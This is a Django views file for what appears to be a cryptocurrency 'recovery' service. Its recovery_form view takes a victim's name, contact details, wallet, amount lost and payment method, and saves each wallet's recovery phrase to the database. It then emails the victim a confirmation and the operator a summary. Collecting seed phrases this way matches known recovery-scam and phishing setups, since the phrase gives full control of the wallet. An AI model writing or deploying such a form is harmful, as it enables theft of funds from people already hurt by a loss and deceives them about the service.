from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.core.mail import send_mail
from .models import Recovery, Wallet
from django.conf import settings
from django.contrib.auth.decorators import login_required
from .forms import RecoveryForm
from django.contrib import messages



 

@login_required
def recovery_form(request):
    if request.method == 'POST':
        form = RecoveryForm(request.POST)
        if form.is_valid():
            wallet = form.cleaned_data['wallet']  # `wallet` is already resolved to the Wallet object

            # Save the recovery request
            recovery = Recovery(
                user=request.user,
                name=form.cleaned_data['name'],
                email=form.cleaned_data['email'],
                phone=form.cleaned_data['phone'],
                wallet=wallet,
                recovery_phrase=form.cleaned_data['recovery_phrase'],
                lost_amount=form.cleaned_data['lost_amount'],
                loss_description=form.cleaned_data['loss_description'],
                payment_method=form.cleaned_data['payment_method']
            )
            recovery.save()

            # Email to the user
            user_email_subject = 'Recovery Request Submitted'
            user_email_message = (
                f"Dear {form.cleaned_data['name']},\n\n"
                "Your recovery request has been successfully submitted.\n\n"
                f"**Recovery Details**:\n"
                f"- Wallet: {wallet.name}\n"
                f"- Amount Lost: ${form.cleaned_data['lost_amount']}\n"
                f"- Payment Method: {form.cleaned_data['payment_method']}\n\n"
                "We will review your request and get back to you shortly.\n\n"
                "Thank you,\nThe Recovery Team"
            )
            try:
                send_mail(
                    subject=user_email_subject,
                    message=user_email_message,
                    from_email=settings.DEFAULT_FROM_EMAIL,
                    recipient_list=[form.cleaned_data['email']],
                )
            except Exception as e:
                print(f"Error sending user email: {e}")

            # Email to the admin
            admin_email_subject = f"New Recovery Request from {form.cleaned_data['name']}"
            admin_email_message = (
                f"A new recovery request has been submitted by {form.cleaned_data['name']}.\n\n"
                f"**User Details**:\n"
                f"- Name: {form.cleaned_data['name']}\n"
                f"- Email: {form.cleaned_data['email']}\n"
                f"- Phone: {form.cleaned_data['phone']}\n\n"
                f"**Recovery Details**:\n"
                f"- Wallet: {wallet.name}\n"
                f"- Amount Lost: ${form.cleaned_data['lost_amount']}\n"
                f"- Loss Description: {form.cleaned_data['loss_description']}\n"
                f"- Payment Method: {form.cleaned_data['payment_method']}\n\n"
                "Please review the request and take appropriate action."
            )
            try:
                send_mail(
                    subject=admin_email_subject,
                    message=admin_email_message,
                    from_email=settings.DEFAULT_FROM_EMAIL,
                    recipient_list=[settings.DEFAULT_FROM_EMAIL],  # Replace with your admin email(s) if needed
                )
            except Exception as e:
                print(f"Error sending admin email: {e}")

            # Add a success message to be displayed on the form page
            messages.success(request, "Your recovery request has been successfully submitted.")

            # Render the same page with a fresh form
            return render(request, 'recovery/form.html', {'form': RecoveryForm()})
        # else:
        #     print("Form errors:", form.errors)  # Debugging: Print form errors
    else:
        form = RecoveryForm()

    return render(request, 'recovery/form.html', {'form': form})



@login_required
def recovery_success(request):
    return render(request, 'recovery/success.html')